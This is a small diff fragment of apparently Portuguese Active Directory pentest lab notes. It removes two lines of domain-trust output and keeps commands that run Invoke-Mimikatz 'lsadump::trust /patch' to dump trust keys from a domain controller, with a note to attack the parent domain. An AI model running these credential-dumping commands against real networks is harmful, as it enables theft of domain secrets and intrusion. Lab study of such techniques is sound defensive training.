@@ -3067,8 +3067,6 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Get-Netdomaintrust
 ```
 dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional   (ATACAR ESSA)
-dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
-dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
 2. NO DOMAIN CONTROLLER, FAZER O DUMP DO HASH DE TRUST:
 ```
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
